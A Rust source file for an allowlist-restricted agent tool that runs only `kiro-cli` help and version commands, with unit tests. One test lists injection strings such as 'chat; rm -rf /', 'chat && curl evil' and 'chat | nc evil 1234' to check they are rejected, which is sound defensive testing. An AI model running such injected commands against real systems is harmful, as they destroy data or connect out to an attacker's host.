//! Narrowly-scoped tool that runs `kiro-cli --help` / `kiro-cli <subcmd> --help`
//! / `kiro-cli --version` only. Distinct from `execute_bash` — there is no
//! shell, no piping, no env interpolation, no positional args beyond a single
//! optional subcommand name. Phase 6 wires this into the kiro-help bot
//! agent's read-only tool list so the LLM can fetch authoritative help text
//! without us auto-approving generic shell access.
//!
//! The validator is a pure function (`validate_args`) so the policy is
//! testable without spawning a process.

use std::io::Write;
use std::process::Output;

use eyre::{
    Result,
    eyre,
};
use serde::{
    Deserialize,
    Serialize,
};

use super::{
    InvokeOutput,
    OutputKind,
    ToolInfo,
};
use crate::os::Os;

/// Subcommands that the bot is allowed to ask for help on. Anything outside
/// this list is rejected — it's how we keep the tool useful without broadening
/// it into a generic exec hatch.
const ALLOWED_SUBCOMMANDS: &[&str] = &[
    "agent",
    "chat",
    "completion",
    "config",
    "context",
    "experiment",
    "help",
    "hooks",
    "issue",
    "login",
    "logout",
    "mcp",
    "prompts",
    "settings",
    "telemetry",
    "tools",
    "user",
    "version",
];

/// Top-level mode the caller is requesting. The agent always picks one of
/// three: `--help` (no subcommand), `<subcommand> --help`, or `--version`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum HelpMode<'a> {
    Help,
    SubcommandHelp(&'a str),
    Version,
}

/// Input to the tool. Exactly one of `subcommand` or `version` is set; if
/// both are absent the tool returns top-level `--help`.
#[derive(Debug, Clone, Deserialize, Default)]
pub struct KiroCliHelp {
    /// Subcommand to fetch help for (e.g. `chat`, `mcp`, `agent`). Must be in
    /// the allowlist; arbitrary strings are rejected.
    #[serde(default)]
    pub subcommand: Option<String>,
    /// When true, ignores `subcommand` and runs `kiro-cli --version`.
    #[serde(default)]
    pub version: bool,
}

#[derive(Debug, Serialize)]
pub struct KiroCliHelpResponse {
    pub mode: String,
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
}

impl KiroCliHelp {
    pub const INFO: ToolInfo = ToolInfo {
        spec_name: "kiro_cli_help",
        preferred_alias: "kiro_cli_help",
        aliases: &["kiro_cli_help"],
    };

    pub async fn validate(&self, _os: &Os) -> Result<()> {
        // Reject up front so the model gets a clear error instead of seeing
        // the tool dispatch and then fail mid-execution.
        self.resolve_mode().map(|_| ())
    }

    pub fn queue_description(&self, tool: &super::tool::Tool, output: &mut impl Write) -> Result<()> {
        use crossterm::{
            queue,
            style,
        };
        let mode = match self.resolve_mode() {
            Ok(HelpMode::Help) => "--help",
            Ok(HelpMode::SubcommandHelp(name)) => return queue!(
                output,
                style::Print(format!("Running `kiro-cli {name} --help`")),
                style::Print("\n"),
            )
            .map_err(Into::into),
            Ok(HelpMode::Version) => "--version",
            Err(e) => return queue!(output, style::Print(format!("Refusing: {e}\n"))).map_err(Into::into),
        };
        queue!(
            output,
            style::Print(format!("Running `kiro-cli {mode}`")),
        )?;
        super::display_tool_use(tool, output)?;
        queue!(output, style::Print("\n"))?;
        Ok(())
    }

    /// Compute the `HelpMode` from the request, rejecting anything that
    /// would broaden the tool past its narrow contract.
    pub fn resolve_mode(&self) -> Result<HelpMode<'_>> {
        validate_args(self.subcommand.as_deref(), self.version)
    }

    pub async fn invoke(&self, _os: &Os, mut updates: impl Write) -> Result<InvokeOutput> {
        let mode = self.resolve_mode()?;
        let args = mode_to_args(mode);
        let mode_label = describe_mode(mode);
        let _ = writeln!(updates, "kiro-cli {}", args.join(" "));

        let output = run_kiro_cli(&args)?;
        let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
        let stderr = String::from_utf8_lossy(&output.stderr).into_owned();
        let exit_code = output.status.code().unwrap_or(-1);

        Ok(InvokeOutput {
            output: OutputKind::Json(serde_json::to_value(KiroCliHelpResponse {
                mode: mode_label.into(),
                stdout,
                stderr,
                exit_code,
            })?),
        })
    }
}

/// Pure validator. Lives outside the impl so tests don't need to construct an
/// `Os` or spawn a child process.
pub fn validate_args(subcommand: Option<&str>, version: bool) -> Result<HelpMode<'_>> {
    if version {
        if subcommand.is_some() {
            return Err(eyre!(
                "kiro_cli_help: pass either `version: true` or `subcommand`, not both"
            ));
        }
        return Ok(HelpMode::Version);
    }
    match subcommand {
        None | Some("") => Ok(HelpMode::Help),
        Some(name) => {
            if !is_allowed_subcommand(name) {
                return Err(eyre!(
                    "kiro_cli_help: subcommand '{name}' is not in the allowlist; \
                     this tool only fetches help/version output for known kiro-cli subcommands"
                ));
            }
            Ok(HelpMode::SubcommandHelp(name))
        },
    }
}

/// Whether `name` is one of the subcommands `kiro_cli_help` will run. The
/// allowlist is intentionally explicit so adding a new command requires a
/// code change + review.
pub fn is_allowed_subcommand(name: &str) -> bool {
    ALLOWED_SUBCOMMANDS.contains(&name)
}

/// Convert a `HelpMode` to the argument vector we pass to `Command::new`.
pub fn mode_to_args(mode: HelpMode<'_>) -> Vec<&str> {
    match mode {
        HelpMode::Help => vec!["--help"],
        HelpMode::SubcommandHelp(name) => vec![name, "--help"],
        HelpMode::Version => vec!["--version"],
    }
}

fn describe_mode(mode: HelpMode<'_>) -> &'static str {
    match mode {
        HelpMode::Help => "--help",
        HelpMode::SubcommandHelp(_) => "<subcommand> --help",
        HelpMode::Version => "--version",
    }
}

#[cfg(not(test))]
fn run_kiro_cli(args: &[&str]) -> Result<Output> {
    Ok(std::process::Command::new("kiro-cli").args(args).output()?)
}

/// Tests stub the exec layer so they don't depend on a real `kiro-cli` binary.
#[cfg(test)]
fn run_kiro_cli(args: &[&str]) -> Result<Output> {
    use std::os::unix::process::ExitStatusExt;
    let stdout = format!("kiro-cli stub help: {}", args.join(" "));
    Ok(Output {
        status: std::process::ExitStatus::from_raw(0),
        stdout: stdout.into_bytes(),
        stderr: Vec::new(),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_input_yields_top_level_help() {
        assert_eq!(validate_args(None, false).unwrap(), HelpMode::Help);
        assert_eq!(validate_args(Some(""), false).unwrap(), HelpMode::Help);
    }

    #[test]
    fn version_flag_yields_version_mode() {
        assert_eq!(validate_args(None, true).unwrap(), HelpMode::Version);
    }

    #[test]
    fn version_with_subcommand_is_rejected() {
        let err = validate_args(Some("chat"), true).unwrap_err();
        assert!(err.to_string().contains("not both"));
    }

    #[test]
    fn allowed_subcommand_yields_subcommand_help() {
        assert_eq!(
            validate_args(Some("chat"), false).unwrap(),
            HelpMode::SubcommandHelp("chat")
        );
        assert_eq!(
            validate_args(Some("mcp"), false).unwrap(),
            HelpMode::SubcommandHelp("mcp")
        );
    }

    #[test]
    fn unknown_subcommand_is_rejected() {
        let err = validate_args(Some("rm"), false).unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("not in the allowlist"), "got: {msg}");
        assert!(msg.contains("'rm'"), "got: {msg}");
    }

    #[test]
    fn shell_metacharacters_are_rejected() {
        // Each of these is a thing an attacker might try — the allowlist
        // catches all of them because none match a real subcommand.
        for evil in [
            "chat; rm -rf /",
            "chat && curl evil",
            "chat | nc evil 1234",
            "$(rm -rf /)",
            "../../bin/sh",
            "chat\nshell",
        ] {
            let err = validate_args(Some(evil), false).unwrap_err();
            assert!(
                err.to_string().contains("not in the allowlist"),
                "expected rejection for {evil:?}"
            );
        }
    }

    #[test]
    fn mode_to_args_produces_correct_argv() {
        assert_eq!(mode_to_args(HelpMode::Help), vec!["--help"]);
        assert_eq!(
            mode_to_args(HelpMode::SubcommandHelp("chat")),
            vec!["chat", "--help"]
        );
        assert_eq!(mode_to_args(HelpMode::Version), vec!["--version"]);
    }

    #[tokio::test]
    async fn invoke_runs_top_level_help() {
        let os = Os::new().await.unwrap();
        let tool = KiroCliHelp::default();
        let mut sink = Vec::new();
        let out = tool.invoke(&os, &mut sink).await.unwrap();
        let json = match out.output {
            OutputKind::Json(v) => v,
            other => panic!("expected JSON output, got {other:?}"),
        };
        assert_eq!(json["exit_code"], 0);
        assert_eq!(json["mode"], "--help");
        // The exec layer is stubbed under cfg(test), so we get a deterministic
        // stdout we can assert against.
        assert!(
            json["stdout"].as_str().unwrap().contains("--help"),
            "stub output: {}",
            json["stdout"]
        );
        let stderr = String::from_utf8(sink).unwrap();
        assert!(stderr.contains("kiro-cli --help"), "trace was {stderr:?}");
    }

    #[tokio::test]
    async fn invoke_rejects_unknown_subcommand() {
        let os = Os::new().await.unwrap();
        let tool = KiroCliHelp {
            subcommand: Some("rm".to_string()),
            version: false,
        };
        let err = tool.invoke(&os, &mut Vec::new()).await.unwrap_err();
        assert!(err.to_string().contains("not in the allowlist"));
    }
}
